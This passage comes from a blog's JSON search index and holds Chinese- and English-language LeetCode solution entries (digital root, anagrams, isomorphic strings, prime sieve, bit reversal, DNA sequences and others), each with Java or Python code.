k/(k+i) × 1/k） = k/(k+i) When k+i reaches n, the probability of each number staying in the reservoir is k/n Example: Choose 3 numbers from [111, 222, 333, 444]. Make sure each number is selected with a probability of 3/4 First, choose [111, 222, 333] as the initial reservior Then choose 444 with a probability of 3/4 For 111, it stays with a probability of P(444 is not selected) + P(444 is selected but it replaces 222 or 333) = 1/4 + 3/4*2/3 = 3/4 The same case with 222 and 333. Now all the numbers have the probability of 3/4 to be picked. Java具体的Java代码如下： 123456789101112131415161718192021222324252627// A function to randomly select k items from stream[0..n-1]. static void selectKItems(int stream[], int n, int k) &#123; int i; // index for elements in stream[] // reservoir[] is the output array. Initialize it with // first k elements from stream[] int reservoir[] = new int[k]; for (i = 0; i &lt; k; i++) reservoir[i] = stream[i]; Random r = new Random(); // Iterate from the (k+1)th element to nth element for (; i &lt; n; i++) &#123; // Pick a random index from 0 to i. int j = r.nextInt(i + 1); // If the randomly picked index is smaller than k, // then replace the element present at the index // with new element from stream if(j &lt; k) reservoir[j] = stream[i]; &#125; &#125; Reference Reservoir Sampling","tags":[],"categories":[{"name":"Algorithm","slug":"Algorithm","permalink":"http://larryim.cc/categories/Algorithm/"}]},{"title":"258. Add Digits","date":"2017-10-09T16:00:00.000Z","path":"2017/10/10/Leetcode-258-Add-Digits/","text":"Given a non-negative integer num, repeatedly add all its digits until the result has only one digit. Example: 1234Input: 38Output: 2 Explanation: The process is like: 3 + 8 = 11, 1 + 1 = 2. Since 2 has only one digit, return it. Follow up: Could you do it without any loop/recursion in $O(1)$ runtime? Java这道题目考查的是对于数字的基本操作。每次从数字中取出最低一位，累加的总和不能超过10. 12345678910111213public int addDigits(int num) &#123; int digit = 0, n = 0; while (num &gt; 9) &#123; n = 0; while (num &gt; 0) &#123; digit = num % 10; n += digit; num /= 10; &#125; num = n; &#125; return num;&#125; 但follow up 里又说了： 你能不使用任何循环/递归在$O(1)$ 时间内解决吗？实际上这是一个有名的数根问题，解决这个问题有一个[Congruence formula]( $$ \\operatorname{dr}(n) = \\begin{cases}0 &amp; \\mbox{if}\\ n = 0, \\ 9 &amp; \\mbox{if}\\ n \\neq 0,\\ n\\ \\equiv 0\\pmod{9},\\ n\\ {\\rm mod}\\ 9 &amp; \\mbox{if}\\ n \\not\\equiv 0\\pmod{9}\\end{cases}$$ $$\\text{或者:} \\mbox{dr}(n) = 1\\ +\\ ((n-1)\\ {\\rm mod}\\ 9)$$ 为了了解这个公式我们先来观察1到20的所有的树根： 1 1 2 2 3 3 4 4 5 5 6 6 7 7 8 8 9 9 10 1 11 2 12 3 13 4 14 5 15 6 16 7 17 8 18 9 19 1 20 2 根据上面的列举，我们可以得出规律，每9个一循环，所有大于9的数的树根都是对9取余，那么对于等于9的数对9取余就是0了，为了得到其本身，而且同样也要对大于9的数适用，就用$(n-1)%9+1$这个表达式来包括所有的情况。 123int addDigits(int num) &#123; return (num - 1) % 9 + 1;&#125;","tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Math","slug":"Math","permalink":"http://larryim.cc/tags/Math/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"716. Max Stack","date":"2017-10-09T16:00:00.000Z","path":"2017/10/10/Leetcode-716-Max-Stack/","text":"Design a max stack that supports push, pop, top, peekMax and popMax. push(x) – Push element $x$ onto stack. pop() – Remove the element on top of the stack and return it. top() – Get the element on the top. peekMax() – Retrieve the maximum element in the stack. popMax() – Retrieve the maximum element in the stack, and remove it. If you find more than one maximum elements, only remove the top-most one. Example 1: 12345678910MaxStack stack = new MaxStack();stack.push(5); stack.push(1);stack.push(5);stack.top(); -&gt; 5stack.popMax(); -&gt; 5stack.top(); -&gt; 1stack.peekMax(); -&gt; 5stack.pop(); -&gt; 1stack.top(); -&gt; 5 Note: $-1e^7 &lt;= x$ &lt;= 1e^7$ Number of operations won’t exceed 10000. The last four operations won’t be called when stack is empty. Java","tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Stack","slug":"Stack","permalink":"http://larryim.cc/tags/Stack/"},{"name":"Design","slug":"Design","permalink":"http://larryim.cc/tags/Design/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"242. Valid Anagram","date":"2017-10-09T16:00:00.000Z","path":"2017/10/10/Leetcode-242-Valid-Anagram/","text":"Given two strings $s$ and $t$ , write a function to determine if $t$ is an anagram of $s$. Example 1: 12Input: s = &quot;anagram&quot;, t = &quot;nagaram&quot;Output: true Example 2: 12Input: s = &quot;rat&quot;, t = &quot;car&quot;Output: false Note: You may assume the string contains only lowercase alphabets. Follow up: What if the inputs contain unicode characters? How would you adapt your solution to such case? Java确认错位词。可以使用两种方法，都非常简单 将字符串中的字符排序，然后一一比较字符是否相等 将字符串中的字符放到哈希表中分类计数，其中一个+1，另一个-1，最后都要等于0 1234567public boolean isAnagram(String s, String t) &#123; if (s.length() != t.length()) return false; char[] sChar = s.toCharArray(), tChar = t.toCharArray(); Arrays.sort(sChar); Arrays.sort(tChar); return Arrays.equals(sChar, tChar);&#125; 利用哈希表分类计数： 123456789101112131415public boolean isAnagram(String s, String t) &#123; if (s.length() != t.length()) return false; // 一共只有26个字母 int[] count = new int[26]; for (int i = 0; i &lt; s.length(); i++) &#123; count[s.charAt(i) - 'a']++; count[t.charAt(i) - 'a']--; &#125; for (int num : count) if (num != 0) return false; return true;&#125;","tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Sort","slug":"Sort","permalink":"http://larryim.cc/tags/Sort/"},{"name":"Hash Table","slug":"Hash-Table","permalink":"http://larryim.cc/tags/Hash-Table/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"209. Minimum Size Subarray Sum","date":"2017-10-09T16:00:00.000Z","path":"2017/10/10/Leetcode-209-Minimum-Size-Subarray-Sum/","text":"Given an array of $n$ positive integers and a positive integer $s$, find the minimal length of a contiguous subarray of which the sum $\\ge s$. If there isn’t one, return 0 instead. Example: 123Input: s = 7, nums = [2, 3, 1, 2, 4, 3]Output: 2Explanation: the subarray [4,3] has the minimal length under the problem constraint. Follow up: If you have figured out the $O(n)$ solution, try coding another solution of which the time complexity is $O(n \\log n)$. Java使用滑动窗口的方法：使用左指针和右指针维持滑动窗口，右指针向右滑动，当滑动窗口表示的子数组的和大于等于$s$时，试图缩小窗口，知道子数组的和小于$s$。重复此过程，找到长度最小的滑动窗口。类似的题目可参照LeetCode 76. Minimum Window Substring。算法时间复杂度为$O(n)$。 123456789101112131415161718192021222324252627282930public int minSubArrayLen(int s, int[] nums) &#123; // 左右指针 int l = 0, r = 0; // 数组的长度 int n = nums.length; // 和大于等于s的最小子数组长度 int minLength = n + 1; // 子数组的和 int sum = 0; while (r &lt; n) &#123; // 子数组的和加上当前数字 sum += nums[r]; // 子数组的和大于等于s while (sum &gt;= s) &#123; // 如果该子数组的长度为最小, 更新最小长度 if (r - l + 1 &lt; minLength) minLength = r - l + 1; // 移动左指针, 并更新子数组的和 sum -= nums[l++]; &#125; r++; &#125; return minLength &gt; n ? 0 : minLength; &#125; 题目还说了试着另一种时间复杂度为$O(n \\log n)$的算法。一看到$O(n \\log n)$的算法，可以想到二分查找。但是数组并不能排序，因为数字的顺序是题目的关键。那么怎么得到有序的数组呢？由于题目限制了所有的数字必须是正整数，所以累加和是有序的！一种巧妙的办法是将原数组nums[i]转换为前$i$个数字的和的数组sums[i]。因此一个子数组的和可以表示为两个累加和的差。这样给定子数组的起点，子数组的终点可以通过二分查找找到。 12345678910111213141516171819202122232425262728293031323334public int minSubArrayLen(int s, int[] nums) &#123; int n = nums.length; int[] sums = new int[n + 1]; // sums[i]为nums中前i个数字的和 for (int i = 0; i &lt; n; i++) sums[i + 1] = sums[i] + nums[i]; // 和大于等于s的最小子数组长度 int minLength = n + 1; for (int start = 0; start &lt; n; start++) &#123; // 以start为开始位置，在接下来的数组中，寻找和为sums[start] + s的值的位置 int end = binarySearch(start + 1, n, sums[start] + s, sums); // 找不到，即使找遍所有的和。 // 由于现在找不到，接下来start变大，寻找区间变小，更找不到了，所以停止搜索 if (end &gt; n) break; // 如果该子数组的长度为最小, 更新最小长度 if (minLength &gt; end - start) minLength = end - start; &#125; return minLength &gt; n ? 0 : minLength;&#125; // 二分查找private int binarySearch(int lo, int hi, int key, int[] keys) &#123; if (lo &gt; hi) return lo; int mid = (lo + hi) / 2; int cmp = keys[mid] - key; if (cmp &lt; 0) return binarySearch(mid + 1, hi, key, keys); else if (cmp &gt; 0) return binarySearch(lo, mid - 1, key, keys); else return mid;&#125;","tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Array","slug":"Array","permalink":"http://larryim.cc/tags/Array/"},{"name":"Two Pointers","slug":"Two-Pointers","permalink":"http://larryim.cc/tags/Two-Pointers/"},{"name":"Binary Search","slug":"Binary-Search","permalink":"http://larryim.cc/tags/Binary-Search/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"205. Isomorphic Strings","date":"2017-10-09T16:00:00.000Z","path":"2017/10/10/Leetcode-205-Isomorphic-Strings/","text":"Given two strings s and t, determine if they are isomorphic. Two strings are isomorphic if the characters in s can be replaced to get t. All occurrences of a character must be replaced with another character while preserving the order of characters. No two characters may map to the same character but a character may map to itself. Example 1: 12Input: s = &quot;egg&quot;, t = &quot;add&quot;Output: true Example 2: 12Input: s = &quot;foo&quot;, t = &quot;bar&quot;Output: false Example 3: 12Input: s = &quot;paper&quot;, t = &quot;title&quot;Output: true Example 4: 12Input: s = &quot;aa&quot;, t = &quot;ab&quot;Output: false Note: You may assume both s and t have the same length. Java确认字符串同构。这道题目最直接的方法是利用HashMap存放一一对应的字符。key-value之间的映射相当于字符之间的对应。当比较字符时，如果字符已经包括在Map中，则取出对应字符，对比是否相同；则否，尝试着存入字符，但字符不能已经包括在value中，不然就不是一一对应了。 12345678910111213141516171819202122public boolean isIsomorphic(String s, String t) &#123; if (s.length() != t.length()) return false; if (s.length() == 0) return true; Map&lt;Character, Character&gt; map = new HashMap&lt;&gt;(); char char1, char2; for (int i = 0; i &lt; s.length(); i++) &#123; char1 = s.charAt(i); char2 = t.charAt(i); // 取出字符，对比 if (map.containsKey(char1)) &#123; if (map.get(char1) != char2) return false; &#125; else &#123; // 字符存在与value中吗？ if (map.containsValue(char2)) return false; // 放入字符对 map.put(char1, char2); &#125; &#125; return true;&#125; 但是map.containsValue()方法是$O(n)$的，所以最坏情况下，isIsomorphic()需要$O(n^2)$的时间复杂度，还好总共只有26个字符，所以影响不大。如果要减少map.containsValue()方法对时间复杂度的影线，可以将value值单独放在HashSet中，实现常数时间的检索。 1234567891011121314151617181920212223public boolean isIsomorphic(String s, String t) &#123; if (s.length() != t.length()) return false; if (s.length() == 0) return true; Map&lt;Character, Character&gt; map = new HashMap&lt;&gt;(); Set&lt;Character&gt; set = new HashSet(); char char1, char2; for (int i = 0; i &lt; s.length(); i++) &#123; char1 = s.charAt(i); char2 = t.charAt(i); // 取出字符，对比 if (map.containsKey(char1)) &#123; if (map.get(char1) != char2) return false; &#125; else &#123; // 字符存在与value中吗？ if (!set.add(char2)) return false; // 放入字符对 map.put(char1, char2); &#125; &#125; return true;&#125; 除了存储字符的一一对应关系，还有什么方法呢？一种更快的方法是存储字符的下标。如果字符一一对应，那么存储的字符的下标一定相同。当遇到下一对字符时，我们先比较这对字符的下标，如果不同，则肯定不是同形字符串。 123456789101112public boolean isIsomorphic(String s, String t) &#123; int[] m1 = new int[128], m2 = new int[128]; int index1, index2; for (int i = 0; i &lt; s.length(); i++) &#123; index1 = s.charAt(i); index2 = t.charAt(i); if (m1[index1] != m2[index2]) return false; m1[index1] = i + 1; m2[index2] = i + 1; &#125; return true;&#125; 上面的代码用了巧妙的方法，使用数组代替哈希表直接存储字符下标。因为ascii字符只有256个，采用大小为256的数组可以代替哈希表：不仅存储及其方便，而且取值也非常快速。","tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Hash Table","slug":"Hash-Table","permalink":"http://larryim.cc/tags/Hash-Table/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"204. Count Primes","date":"2017-10-09T16:00:00.000Z","path":"2017/10/10/Leetcode-204-Count-Primes/","text":"Count the number of prime numbers less than a non-negative number, $n$. Example: 123Input: 10Output: 4Explanation: There are 4 prime numbers less than 10, they are 2, 3, 5, 7. JavaThe Sieve of Eratosthenes is one of the most efficient ways to find all prime numbers up to $n$. We start off with a table of $n$ numbers. Let’s look at the first number, 2. We know all multiples of 2 must not be primes, so we mark them off as non-primes. Then we look at the next number, 3. Similarly, all multiples of 3 such as 3 × 2 = 6, 3 × 3 = 9, … must not be primes, so we mark them off as well. Now we look at the next number, 4, which was already marked off. So we can skip 4 immediately and go to the next number, 5. Now, all multiples of 5 such as 5 × 2 = 10, 5 × 3 = 15, 5 × 4 = 20, 5 × 5 = 25, … can be marked off. In fact, we can mark off multiples of 5 starting at 5 × 5 = 25, because 5 × 2 = 10 was already marked off by multiple of 2, similarly 5 × 3 = 15 was already marked off by multiple of 3. Therefore, if the current number is p, we can always mark off multiples of p starting at $p^2$, then in increments of p: $p^2 + p, p^2 + 2p$, … The terminating loop condition can be $p &lt; \\sqrt{n}$, as all non-primes $\\ge \\sqrt{n}$$ must have already been marked off. The Sieve of Eratosthenes uses an extra $O(n)$ memory and its runtime complexity is $O(n \\log\\log n)$. 123456789101112131415public int countPrimes(int n) &#123; // boolean[] are initialed as false by default boolean[] notPrime = new boolean[n]; for (int i = 2; i*i &lt; n; i++) &#123; if (!notPrime[i]) &#123; for (int j = i*i; j &lt; n; j += i) notPrime[j] = true; &#125; &#125; int count = 0; for (int i = 2; i &lt; n; i++) if (!notPrime[i]) count++; return count;&#125; 但其实Sieve of Eratosthenes方法并不快，虽然它的算法复杂度非常好。因为它反复需要计算乘积，对于整数来说，它的表示范围本来就很小，这种算法上的优化并没有什么用。反而下面的快一些，把判断条件改为$i&lt;n$。 12345678910111213public int countPrimes(int n) &#123; boolean[] notPrime = new boolean[n]; int count = 0; for (int i = 2; i &lt; n; i++) &#123; if (notPrime[i] == false) &#123; count++; for (int j = 2*i; j &lt; n; j += i) notPrime[j] = true; &#125; &#125; return count;&#125;","tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Hash Table","slug":"Hash-Table","permalink":"http://larryim.cc/tags/Hash-Table/"},{"name":"Math","slug":"Math","permalink":"http://larryim.cc/tags/Math/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"202. Happy Number","date":"2017-10-09T16:00:00.000Z","path":"2017/10/10/Leetcode-202-Happy-Number/","text":"Write an algorithm to determine if a number is “happy”. A happy number is a number defined by the following process: Starting with any positive integer, replace the number by the sum of the squares of its digits, and repeat the process until the number equals 1 (where it will stay), or it loops endlessly in a cycle which does not include 1. Those numbers for which this process ends in 1 are happy numbers. Example: Input: 19Output: trueExplanation: 12 + 92 = 8282 + 22 = 6862 + 82 = 10012 + 02 + 02 = 1 Java直接采用题目所定义的Happy Number来写。采用HashSet判断重复。 1234567891011121314public boolean isHappy(int n) &#123; HashSet set = new HashSet(); while (n != 1) &#123; if (!set.add(n)) return false; int nt = n, digit; n = 0; while (nt != 0) &#123; digit = nt % 10; n += digit*digit; nt /= 10; &#125; &#125; return true;&#125;","tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Hash Table","slug":"Hash-Table","permalink":"http://larryim.cc/tags/Hash-Table/"},{"name":"Math","slug":"Math","permalink":"http://larryim.cc/tags/Math/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"200. Number of Islands","date":"2017-10-09T16:00:00.000Z","path":"2017/10/10/Leetcode-200-Number-of-Islands/","text":"Given a 2d grid map of &#39;1&#39;s (land) and &#39;0&#39;s (water), count the number of islands. An island is surrounded by water and is formed by connecting adjacent lands horizontally or vertically. You may assume all four edges of the grid are all surrounded by water. Example 1: 12345678Input:11110110101100000000Output: 1 Example 2: 12345678Input:11000110000010000011Output: 3 Java这道题目其实和Q130. Surrounded Regions一摸一样，换汤不换药，把字母O换成了1，仅此而已。省略吧，不写了。","tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Union Find","slug":"Union-Find","permalink":"http://larryim.cc/tags/Union-Find/"},{"name":"Depth-First Search","slug":"Depth-First-Search","permalink":"http://larryim.cc/tags/Depth-First-Search/"},{"name":"Breath-First Search","slug":"Breath-First-Search","permalink":"http://larryim.cc/tags/Breath-First-Search/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"2. Add Two Numbers","date":"2017-10-09T16:00:00.000Z","path":"2017/10/10/Leetcode-2-Add-Two-Numbers/","text":"You are given two non-empty linked lists representing two non-negative integers. The digits are stored in reverse order and each of their nodes contain a single digit. Add the two numbers and return it as a linked list. You may assume the two numbers do not contain any leading zero, except the number 0 itself. Example 123Input: (2 -&gt; 4 -&gt; 3) + (5 -&gt; 6 -&gt; 4)Output: 7 -&gt; 0 -&gt; 8Explanation: 342 + 465 = 807. Java题目思路是非常直接的，难点在于考虑进位的情况。首先正常操作加法，直到有一个数加完了。然后将链表指向剩余的那个数。但是有可能还有进位，所以要将剩余的数加上1，更新后面的链表。 12345678910111213141516171819202122232425262728293031323334ListNode root = new ListNode(-1);ListNode cur = root;int carry = 0;// 最高有效位为min(l1, l2)while (l1 != null &amp;&amp; l2 != null) &#123; int num = l1.val + l2.val + carry; if (num &gt; 9) &#123; num -= 10; carry = 1; &#125; else carry = 0; cur.next = new ListNode(num); cur = cur.next; l1 = l1.next; l2 = l2.next;&#125; // 补上后面的if (l1 == null) cur.next = l2;else cur.next = l1;//carry != 0ListNode prev = cur;cur = cur.next;while (cur != null &amp;&amp; carry != 0) &#123; int num = cur.val + carry; if (num &gt; 9) &#123; num -= 10; carry = 1; &#125; else carry = 0; cur.val = num; prev = cur; cur = cur.next;&#125;if (carry == 1) prev.next = new ListNode(1);return root.next; 另一种方法是始终生成新的链表节点。由于新的节点等于链表1的节点，加上链表2的节点，加上进位，所以当链表1或者链表2加完以后，省去该步骤。该方法看起来比较统一、简洁，不用额外处理进位。 1234567891011121314151617181920212223242526public ListNode addTwoNumbers(ListNode l1, ListNode l2) &#123; ListNode root = new ListNode(-1); ListNode cur = root; int carry = 0; // 最高有效位为min(l1, l2) while (l1 != null || l2 != null || carry !=0) &#123; int num = 0; if (l1 != null) &#123; num = l1.val; l1 = l1.next; &#125; if (l2 != null) &#123; num += l2.val; l2 = l2.next; &#125; num += carry; if (num &gt; 9) &#123; num -= 10; carry = 1; &#125; else carry = 0; cur.next = new ListNode(num); cur = cur.next; &#125; return root.next;&#125; Python与Java的方法2相同。 12345678910111213141516171819202122232425262728# Definition for singly-linked list.# class ListNode:# def __init__(self, x):# self.val = x# self.next = Noneclass Solution: def addTwoNumbers(self, l1, l2): \"\"\" :type l1: ListNode :type l2: ListNode :rtype: ListNode \"\"\" carry = 0 # 处理技巧1: 使用carry root = ln = ListNode(0) while l1 or l2 or carry: l1val = l2val = 0 # 初始化l1val和l2val if l1: l1val = l1.val l1 = l1.next if l2: l2val = l2.val l2 = l2.next carry, val = divmod(l1val+l2val+carry, 10) #divmod return quotient and reminder ln.next = ListNode(val) ln = ln.next return root.next","tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Linked List","slug":"Linked-List","permalink":"http://larryim.cc/tags/Linked-List/"},{"name":"Math","slug":"Math","permalink":"http://larryim.cc/tags/Math/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"873. Length of Longest Fibonacci Subsequence","date":"2017-10-09T16:00:00.000Z","path":"2017/10/10/Leetcode-873-Length-of-Longest-Fibonacci-Subsequence/","text":"A sequence $X_1, X_2, …, X_n$ is fibonacci-like if: $n &gt;= 3$ $Xi + X{i+1} = X_{i+2}$ for all $i + 2 &lt;= n$ Given a strictly increasing array A of positive integers forming a sequence, find the length of the longest fibonacci-like subsequence of A. If one does not exist, return 0. (Recall that a subsequence is derived from another sequence A by deleting any number of elements (including none) from A, without changing the order of the remaining elements. For example, [3, 5, 8] is a subsequence of [3, 4, 5, 6, 7, 8].) Example 1: 1234Input: [1,2,3,4,5,6,7,8]Output: 5Explanation:The longest subsequence that is fibonacci-like: [1,2,3,5,8]. Example 2: 12345Input: [1,3,7,11,12,14,18]Output: 3Explanation:The longest subsequence that is fibonacci-like:[1,11,12], [3,11,14] or [7,11,18]. Note: 3 &lt;= A.length &lt;= 1000 1 &lt;= A[0] &lt; A[1] &lt; … &lt; A[A.length - 1] &lt;= $10^9$ Java","tags":[{"name":"Dynamic Programming","slug":"Dynamic-Programming","permalink":"http://larryim.cc/tags/Dynamic-Programming/"},{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Array","slug":"Array","permalink":"http://larryim.cc/tags/Array/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"190. Reverse Bits","date":"2017-10-09T16:00:00.000Z","path":"2017/10/10/Leetcode-190-Reverse-Bits/","text":"Reverse bits of a given 32 bits unsigned integer. Example: 1234Input: 43261596Output: 964176192Explanation: 43261596 represented in binary as 00000010100101000001111010011100, return 964176192 represented in binary as 00111001011110000010100101000000. Follow up: If this function is called many times, how would you optimize it? Java这道题目没有什么特别难的地方，考察的是基本的位操作。主要过程为遍历二进制数字，依次交换头尾二进制位。关键有两点: 取出二进制的任意一位 改变二进制的任意一位 取出二进制的任意一位的方法是将$n$右移$i$位，和1按位与: 1(n &gt;&gt;&gt; i) &amp; 1 将某一位强制转换为1: 123value = value | 0x01; //将 bit0 强制转换为1 (假设最低位称为bit0,然后是bit1, bit2...,下同）value = value | 0x80; //将 bit7 强制转换为1value = value | (0x01 &lt;&lt; N); //将 bitN 强制转换为1 将某一位强制转换为0: 123value = value &amp; 0xfe; //将 bit0 强制转换0value = value &amp; 0x7f; //将 bit7 强制转换成0value = value &amp; (~(0x01 &lt;&lt; N)); //将 bitN 强制转换成0 如果了解这些基本操作，这道题目就非常简单了： 1234567891011121314151617public int reverseBits(int n) &#123; for (int i = 0; i &lt; 16; i++) &#123; int j = 31 - i; int lowBit = n &gt;&gt;&gt; i &amp; 1; // 取出第i位 int highBit = n &gt;&gt;&gt; j &amp; 1; // 取出第32-i位 // 交换 if (lowBit == highBit) continue; if (highBit == 0) &#123; n &amp;= ~(1 &lt;&lt; i); // lowBit转换为0 n |= 1 &lt;&lt; j; // highBit转换为1 &#125; else &#123; n |= 1 &lt;&lt; i; // lowBit转换为1 n &amp;= ~(1 &lt;&lt; j); // highBit转换为0 &#125; &#125; return n;&#125; 另一种方法是将反转的数字存在另一个数当中，省去了交换，依次从该二进制数中取出最低位，然后放到另一个数当中。 12345678910public int reverseBits(int n) &#123; int result = 0; for (int i = 0; i &lt; 32; i++) &#123; result += n &amp; 1; // 取出第i位数字 n &gt;&gt;&gt;= 1; if (i &lt; 31) // 对于最后一位数字，不能右移 result &lt;&lt;= 1; // 结果右移一位 &#125; return result;&#125; 这种方法慢一些。","tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Bit Manipulation","slug":"Bit-Manipulation","permalink":"http://larryim.cc/tags/Bit-Manipulation/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"187. Repeated DNA Sequences","date":"2017-10-09T16:00:00.000Z","path":"2017/10/10/Leetcode-187-Repeated-DNA-Sequences/","text":"All DNA is composed of a series of nucleotides abbreviated as A, C, G, and T, for example: “ACGAATTCCG”. When studying DNA, it is sometimes useful to identify repeated sequences within the DNA. Write a function to find all the 10-letter-long sequences (substrings) that occur more than once in a DNA molecule. Example: 123Input: s = &quot;AAAAACCCCCAAAAACCCCCCAAAAAGGGTTT&quot;Output: [&quot;AAAAACCCCC&quot;, &quot;CCCCCAAAAA&quot;] Java最直接的方法是依次取出长度为10的子字符串，放入哈希表中，计算子字符串出现的次数。当子字符串出现的次数大于1时，加入到结果中。 1234567891011121314public List&lt;String&gt; findRepeatedDnaSequences(String s) &#123; List&lt;String&gt; list = new ArrayList&lt;&gt;(); if (s == null || s.length() &lt; 10) return list; HashMap&lt;String, Integer&gt; map = new HashMap&lt;&gt;(); for (int i = 10; i &lt;= s.length(); i++) &#123; String sub = s.substring(i - 10, i); map.put(sub, map.getOrDefault(sub, 0) + 1); &#125; for (Map.Entry&lt;String, Integer&gt; entry : map.entrySet()) if (entry.getValue() &gt; 1) list.add(entry.getKey()); return list;&#125; 利用位操作也可以寻找到重复的子字符串。方法是将字符A、C、G、T映射成数字0，1，2，3。注意到数字0，1，2，3对应的二进制数字的有效位数为2，那么我们可以用两个二进制位来表示一个字符，也就是说用20个二进制位来表示一个长度为10的字符串。既然一个整数int长度为32位，那么可以用int来表示长度为10的字符串。所以只需要验证整数是否重复出现，来代替验证子字符串是否重复出现。一方面节省了空间复杂度（一个整数比10个字符占用的空间小），另一方面节省了时间复杂度（整数的hashCode()计算比字符串要简单，整数的hash值即为整数本身）。 12345678910111213141516171819202122232425public List&lt;String&gt; findRepeatedDnaSequences(String s) &#123; Set&lt;Integer&gt; words = new HashSet&lt;&gt;(); Set&lt;Integer&gt; doubleWords = new HashSet&lt;&gt;(); List&lt;String&gt; rv = new ArrayList&lt;&gt;(); // 将字符映射成数字 char[] map = new char[26]; map['A' - 'A'] = 0; map['C' - 'A'] = 1; map['G' - 'A'] = 2; map['T' - 'A'] = 3; for(int i = 0; i &lt; s.length() - 9; i++) &#123; int v = 0; // 将长度位10的字符串转化为一个整数 for (int j = i; j &lt; i + 10; j++) &#123; v &lt;&lt;= 2; v |= map[s.charAt(j) - 'A']; &#125; // 查看是否已经访问过该字符串 if(!words.add(v) &amp;&amp; doubleWords.add(v)) rv.add(s.substring(i, i + 10)); &#125; return rv;&#125; Can we do better? YES! 上面说到只需要20位二进制数字就可以表示长度为10的子字符串，但是在构建对应的数字的时候，每次都是从头开始的，有这个必要吗？其实每次左移2位，然后取最低20位就可以了！ 1234567891011121314151617181920public List&lt;String&gt; findRepeatedDnaSequences(String s) &#123; Set&lt;Integer&gt; words = new HashSet&lt;&gt;(); Set&lt;Integer&gt; doubleWords = new HashSet&lt;&gt;(); List&lt;String&gt; rv = new ArrayList&lt;&gt;(); char[] map = new char[26]; map['A' - 'A'] = 0; map['C' - 'A'] = 1; map['G' - 'A'] = 2; map['T' - 'A'] = 3; int v = 0; for (int i = 0 i &lt; s.length(); i++) &#123; // 每次取出最低20位二进制数字 v = ((v &lt;&lt; 2) | (map[s.charAt(i) - 'A'])) &amp; 0xfffff; if (i &lt; 9) continue; if(!words.add(v) &amp;&amp; doubleWords.add(v)) rv.add(s.substring(i - 9, i + 1)); &#125; return rv;&#125;","tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Hash Table","slug":"Hash-Table","permalink":"http://larryim.cc/tags/Hash-Table/"},{"name":"Bit Manipulation","slug":"Bit-Manipulation","permalink":"http://larryim.cc/tags/Bit-Manipulation/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"760. Find Anagram Mappings","date":"2017-10-09T16:00:00.000Z","path":"2017/10/10/Leetcode-760-Find-Anagram-Mappings/","text":"Given two lists A and B, and B is an anagram of A. B is an anagram of A means B is made by randomizing the order of the elements in A. We want to find an index mapping P, from A to B. A mapping P[i] = j means the ith element in A appears in B at index j. These lists A and B may contain duplicates. If there are multiple answers, output any of them. Example 12345Given A = [12, 28, 46, 32, 50] and B = [50, 12, 32, 46, 28], return [1, 4, 3, 2, 0].Explanation:as P[0] = 1 because the 0th element of A appears at B[1], and P[1] = 4 because the 1st element of A appears at B[4], and so on. Note: A, B have equal lengths in range [1, 100]. A[i], B[i] are integers in range [0, 10^5]. Java这道题目LeetCode收费，没有会员的请前往LintCode。一看到这道题目就会想起LeetCode 205. Isomorphic Strings。在Q205中，确认字符串是否同构的关键步骤是构造一个映射，而这里题目明确指明需要求出这个映射。唯一的区别是，Q205里是字符串，这里是数字。 12345678910public int[] anagramMappings(int[] A, int[] B) &#123; int[] res = new int[A.length]; Map&lt;Integer, Integer&gt; map = new HashMap&lt;&gt;(); for (int i = 0; i &lt; B.length; i++) map.put(B[i], i); for (int i = 0; i &lt; A.length; i++) res[i] = map.get(A[i]); return res;&#125;","tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Hash Table","slug":"Hash-Table","permalink":"http://larryim.cc/tags/Hash-Table/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"171. Excel Sheet Column Number","date":"2017-10-09T16:00:00.000Z","path":"2017/10/10/Leetcode-171-Excel-Sheet-Column-Number/","text":"Given a column title as appear in an Excel sheet, return its corresponding column 